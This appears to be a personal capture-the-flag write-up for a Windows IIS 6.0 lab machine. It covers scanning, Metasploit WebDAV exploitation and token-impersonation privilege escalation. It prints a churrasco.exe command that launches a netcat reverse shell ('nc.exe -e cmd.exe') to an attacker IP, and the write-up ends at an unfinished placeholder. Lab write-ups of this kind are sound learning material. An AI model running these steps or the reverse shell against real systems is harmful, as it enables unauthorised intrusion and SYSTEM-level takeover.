Box: Windows
Level: Easy
### Index
1. Initial Access using iis_webdav_scstoragepathfromurl - msfconsole 
2. Failed attempt of [SeImpersonate Privilege](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/)
3. Failed attempt of multiple MS Missing Patches exploits

Nmap reveals the following result
```
$ nmap -T4 --min-rate=1000 -p- -sC -sV -Pn 10.10.10.14
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Tue, 06 Aug 2024 15:55:20 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Trying the iis_webdav_scstoragepathfromurl from msfconsole gets the "nt authority\network service" shell but no access to user flag.
```
Just setup the RHOST and LHOST and run the exploit. 
```

winPEAS.bat reveals the following results. 
```
PRIVILEGES INFORMATION                
----------------------                                                                                                                                  Privilege Name                Description                               State
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
**SeImpersonatePrivilege        Impersonate a client after authentication Enabled**
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

Failed attempt of [SeImpersonate Privilege](https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/) at this stage. But there are couple of well-known Windows Privilege Escalation Technique that we can cover for this box. Each one is explain with the reference link below.

Following are the couple of links I would highly advice myself to read again and again

1. [Abusing Token Privileges For Windows Local Privilege Escalation](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
2. [Rotten Potato – Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) 
3. [Hot Potato – Windows Privilege Escalation](https://foxglovesecurity.com/2016/01/16/hot-potato/)
4. [Privilege Escalation (Windows) – churrasco.exe](https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)
5. [Privilege Escalation (Windows) – JuicyPotato.exe](https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/)

Churrasco.exe was ran with the following command when the netcat listener was on.
```
C:\tmp>churrasco.exe -d "C:\tmp\nc.exe -e cmd.exe 10.10.16.5 443"
churrasco.exe -d "C:\tmp\nc.exe -e cmd.exe 10.10.16.5 443"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 672 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 680 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 688 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```

The reverse shell was captured with elevated privileges.

For this box, we used Churrasco.exe exploit. The Churrasco.exe exploits the  [Get the notes from PDF - Third last tab of Firefox.]
	